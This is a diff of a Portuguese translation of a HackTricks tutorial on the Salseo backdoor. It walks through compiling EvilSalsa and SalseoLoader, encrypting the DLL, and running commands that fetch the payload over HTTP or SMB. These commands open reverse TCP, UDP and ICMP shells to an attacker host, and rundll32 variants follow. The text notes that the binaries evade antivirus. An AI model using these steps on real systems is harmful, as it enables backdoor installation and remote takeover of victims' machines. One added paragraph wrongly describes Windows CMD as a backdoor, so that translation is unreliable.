@@ -2,15 +2,15 @@
 
 <details>
 
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
@@ -18,21 +18,21 @@ Outras formas de apoiar o HackTricks:
 
 Baixe o código-fonte do github e compile **EvilSalsa** e **SalseoLoader**. Você precisará do **Visual Studio** instalado para compilar o código.
 
-Compile esses projetos para a arquitetura do sistema Windows onde você vai usá-los (Se o Windows suportar x64, compile para essa arquitetura).
+Compile esses projetos para a arquitetura da máquina Windows onde você irá usá-los (Se o Windows suportar x64, compile-os para essa arquitetura).
 
-Você pode **selecionar a arquitetura** dentro do Visual Studio na aba **"Build"** à esquerda em **"Platform Target".**
+Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build"** no **"Platform Target".**
 
-(**Se você não encontrar essas opções, pressione na aba "Project"** e depois em **"\<Nome do Projeto> Properties"**)
+(\*\*Se você não encontrar essas opções, clique em **"Project Tab"** e depois em **"\<Project Name> Properties"**)
 
 ![](<../.gitbook/assets/image (132).png>)
 
-Então, construa ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):
+Em seguida, compile ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
-## Prepare o Backdoor
+## Preparar o Backdoor
 
-Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para isso, você pode usar o script python **encrypterassembly.py** ou você pode compilar o projeto **EncrypterAssembly**:
+Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para fazer isso, você pode usar o script python **encrypterassembly.py** ou pode compilar o projeto **EncrypterAssembly**:
 
 ### **Python**
 ```
@@ -44,15 +44,19 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-## **Executar o backdoor**
+Ok, agora você tem tudo o que precisa para executar todo o Salseo: o **EvilDalsa.dll codificado** e o **binário do SalseoLoader.**
 
-### **Obtendo um shell reverso TCP (baixando a dll codificada via HTTP)**
+**Faça o upload do binário SalseoLoader.exe na máquina. Eles não devem ser detectados por nenhum AV...**
 
-Lembre-se de iniciar um nc como o ouvinte do shell reverso e um servidor HTTP para servir o evilsalsa codificado.
+## **Executar a backdoor**
+
+### **Obtendo um shell reverso TCP (baixando dll codificada através do HTTP)**
+
+Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor HTTP para servir o EvilDalsa codificado.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Obtendo um shell reverso UDP (baixando dll codificada via SMB)**
+### **Obtendo um shell reverso UDP (baixando um dll codificado através do SMB)**
 
 Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor SMB para servir o evilsalsa codificado (impacket-smbserver).
 ```
@@ -69,15 +73,15 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### Execute o cliente:
+#### Executar o cliente:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Dentro da vítima, vamos executar o salseo:
+#### Dentro da vítima, vamos executar o negócio do salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Compilando SalseoLoader como DLL exportando função principal
+## Compilando o SalseoLoader como DLL exportando a função principal
 
 Abra o projeto SalseoLoader usando o Visual Studio.
 
@@ -85,19 +89,19 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### Instale DllExport para este projeto
+### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Procure pelo pacote DllExport (usando a aba Procurar), e pressione Instalar (e aceite o popup)**
+#### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-No seu diretório do projeto apareceram os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
+Na pasta do seu projeto aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
-### **Desinstale** DllExport
+### **Desinstale o DllExport**
 
 Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
@@ -107,15 +111,15 @@ Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
 Apenas **saia** do Visual Studio
 
-Depois, vá até a sua **pasta SalseoLoader** e **execute DllExport\_Configure.bat**
+Em seguida, vá para a sua **pasta do SalseoLoader** e **execute DllExport\_Configure.bat**
 
-Selecione **x64** (se você vai usar em um sistema x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**
+Selecione **x64** (se você for usá-lo dentro de um ambiente x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
 ### **Abra o projeto novamente com o Visual Studio**
 
-**\[DllExport]** não deve mais ser marcado como erro
+**\[DllExport]** não deve mais estar marcado como erro
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
@@ -125,15 +129,15 @@ Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades d
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Construir --> Alvo da plataforma = x64)
+Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compilar --> Destino da plataforma = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Para **construir** a solução: Construir --> Construir Solução (Dentro do console de Saída o caminho da nova DLL aparecerá)
+Para **construir** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)
 
-### Teste a Dll gerada
+### Teste a DLL gerada
 
-Copie e cole a Dll onde você quer testá-la.
+Copie e cole a DLL onde deseja testá-la.
 
 Execute:
 ```
@@ -143,7 +147,7 @@ Se nenhum erro aparecer, provavelmente você tem uma DLL funcional!!
 
 ## Obter um shell usando a DLL
 
-Não se esqueça de usar um **servidor HTTP** e configurar um **listener nc**
+Não se esqueça de usar um **servidor HTTP** e configurar um **ouvinte nc**
 
 ### Powershell
 ```
@@ -155,6 +159,8 @@ $env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
+
+O **CMD** é um backdoor simples que permite a execução de comandos no sistema operacional alvo. Ele pode ser usado para obter informações do sistema, manipular arquivos e executar outras atividades maliciosas. É importante proteger o sistema contra a instalação e execução desse tipo de backdoor.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -165,14 +171,14 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
